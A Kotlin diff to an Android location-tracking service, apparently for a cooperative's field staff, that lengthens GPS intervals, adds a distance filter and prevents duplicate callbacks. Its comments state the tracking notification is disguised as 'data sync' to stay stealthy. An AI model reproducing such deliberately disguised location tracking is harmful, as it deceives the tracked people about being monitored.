@@ -33,7 +33,7 @@ import com.example.koperasikitagodangulu.services.LocationCheckWorker
  * PENTING:
  * - Notifikasi ditampilkan sebagai "Sinkronisasi data..." agar stealth
  * - Menggunakan FusedLocationProviderClient (paling akurat)
- * - Update setiap 30 detik
+ * - Update tiap 60 detik & hanya saat bergerak ≥20m (hemat baterai)
  * - Overwrite 1 node di Firebase (hemat biaya)
  * - Otomatis stop ketika pengawas matikan tracking
  * =========================================================================
@@ -44,8 +44,9 @@ class LocationTrackingService : Service() {
         private const val TAG = "LocationTrackingService"
         private const val CHANNEL_ID = "sync_channel"  // ← SAMA dengan SyncForegroundService agar stealth
         private const val NOTIFICATION_ID = 1002
-        private const val UPDATE_INTERVAL_MS = 30_000L  // 30 detik
-        private const val FASTEST_INTERVAL_MS = 15_000L // Minimum 15 detik
+        private const val UPDATE_INTERVAL_MS = 60_000L  // 60 detik
+        private const val FASTEST_INTERVAL_MS = 30_000L // Minimum 30 detik
+        private const val MIN_UPDATE_DISTANCE_M = 20f   // jangan update saat diam (<20m)
 
         fun start(context: Context) {
             try {
@@ -155,6 +156,12 @@ class LocationTrackingService : Service() {
             return
         }
 
+        // ✅ ANTI-STACKING: start() bisa dipanggil banyak sumber (ConnectionKeeper,
+        // Monitor, Worker 15-mnt, FCM, restart START_STICKY). Tanpa melepas callback
+        // lama dulu, tiap pemanggilan menumpuk 1 stream GPS hantu yang tak pernah
+        // di-remove → boros baterai. Pastikan hanya ada 1 callback aktif.
+        stopLocationUpdates()
+
         // ✅ LANGKAH 1: Kirim lokasi terakhir dari cache SEGERA (tanpa tunggu GPS fix)
         try {
             fusedLocationClient.lastLocation.addOnSuccessListener { location ->
@@ -185,6 +192,8 @@ class LocationTrackingService : Service() {
             UPDATE_INTERVAL_MS
         ).apply {
             setMinUpdateIntervalMillis(FASTEST_INTERVAL_MS)
+            // Distance filter: tidak ada update (dan tidak ada write Firebase) saat diam.
+            setMinUpdateDistanceMeters(MIN_UPDATE_DISTANCE_M)
             // DIHAPUS: setWaitForAccurateLocation(true) → agar lokasi dikirim secepat mungkin
         }.build()
 
